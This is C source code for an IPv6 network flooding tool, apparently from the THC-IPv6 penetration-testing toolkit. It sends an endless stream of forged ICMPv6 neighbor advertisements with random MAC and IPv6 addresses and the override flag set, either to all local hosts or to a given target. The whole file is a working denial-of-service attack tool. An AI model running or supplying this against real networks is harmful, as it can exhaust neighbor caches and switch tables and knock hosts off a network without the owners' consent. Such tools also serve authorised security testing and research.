#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <sys/wait.h>
#include <time.h>
#include <pcap.h>
#include "thc-ipv6.h"

void help(char *prg) {
  printf("%s %s (c) 2020 by %s %s\n\n", prg, VERSION, AUTHOR, RESOURCE);
  printf("Syntax: %s [-k | -m mac] interface [target]\n\n", prg);
  printf("Flood the local network with neighbor advertisements.\n");
  printf(
      "Option -k sends with your real src mac, -m with a specified src mac, "
      "random for each packet otherwise.\n");
  //  printf("Use -r to use raw mode.\n\n");
  exit(-1);
}

int main(int argc, char *argv[]) {
  char *         interface, mac[6] = "";
  unsigned char *mac6 = mac, *ip6;
  unsigned char  buf[24], srcmac[8] = "", *smac = NULL;
  unsigned char *dst = thc_resolve6("ff02::1"),
                *dstmac = thc_get_multicast_mac(dst);
  int            i;
  unsigned char *pkt = NULL;
  int pkt_len = 0, flags, rawmode = 0, count = 0, prefer = PREFER_LINK,
      keepmac = 0;

  if (argc > 2 && strncmp(argv[1], "-k", 2) == 0) {
    keepmac = 1;
    if ((smac = thc_get_own_mac(argv[2])) == NULL) {
      fprintf(stderr, "Error: invalid interface %s\n", argv[2]);
      exit(-1);
    }
    argv++;
    argc--;
  }
  if (argc > 2 && strncmp(argv[1], "-m", 2) == 0) {
    sscanf(argv[2], "%x:%x:%x:%x:%x:%x", (unsigned int *)&srcmac[0],
           (unsigned int *)&srcmac[1], (unsigned int *)&srcmac[2],
           (unsigned int *)&srcmac[3], (unsigned int *)&srcmac[4],
           (unsigned int *)&srcmac[5]);
    smac = srcmac;
    argv += 2;
    argc -= 2;
  }
  if (smac != NULL) mac6 = smac;

  if (argc < 2 || argc > 4 || strncmp(argv[1], "-h", 2) == 0) help(argv[0]);

  srand(time(NULL) + getpid());
  setvbuf(stdout, NULL, _IONBF, 0);

  interface = argv[1];
  if (thc_get_own_mac(interface) == NULL) {
    fprintf(stderr, "Error: invalid interface %s\n", interface);
    exit(-1);
  }
  if (argc == 3) {
    if ((dst = thc_resolve6(argv[2])) == NULL) {
      fprintf(stderr, "Error: invalid target IPv6 address\n");
      exit(-1);
    } else {
      dstmac = thc_get_mac(interface, NULL, dst);
    }
    if (dst[0] >= 0x20 && dst[0] <= 0xfd) prefer = PREFER_GLOBAL;
  }

  ip6 = thc_get_own_ipv6(interface, dst, prefer);

  mac[0] = 0x00;
  mac[1] = 0x18;
  memset(ip6 + 8, 0, 8);
  ip6[8] = 0x02;
  ip6[9] = mac[1];
  ip6[11] = 0xff;
  ip6[12] = 0xfe;
  memset(buf, 0, sizeof(buf));
  buf[16] = 2;
  buf[17] = 1;
  buf[18] = mac[0];
  buf[19] = mac[1];
  memcpy(buf, ip6, 16);
  flags = ICMP6_NEIGHBORADV_OVERRIDE;

  printf(
      "Starting to flood network with neighbor advertisements on %s (Press "
      "Control-C to end, a dot is printed for every 1000 packets):\n",
      interface);
  while (1) {
    for (i = 2; i < 6; i++)
      mac[i] = rand() % 256;

    //    ip6[9] = mac[1];
    ip6[10] = mac[2];
    ip6[13] = mac[3];
    ip6[14] = mac[4];
    ip6[15] = mac[5];

    count++;
    memcpy(buf + 10, ip6 + 10, 6);
    memcpy(&buf[20], mac + 2, 4);

    if ((pkt = thc_create_ipv6_extended(interface, prefer, &pkt_len, ip6, dst,
                                        255, 0, 0, 0, 0)) == NULL)
      return -1;
    if (thc_add_icmp6(pkt, &pkt_len, ICMP6_NEIGHBORADV, 0, flags, buf,
                      sizeof(buf), 0) < 0)
      return -1;
    if (thc_generate_and_send_pkt(interface, mac6, dstmac, pkt, &pkt_len) < 0) {
      //      fprintf(stderr, "Error sending packet no. %d on interface %s: ",
      //      count, interface); perror(""); return -1;
      printf("!");
    }

    pkt = thc_destroy_packet(pkt);
    //    usleep(1);
    if (count % 1000 == 0) printf(".");
  }
  return 0;
}
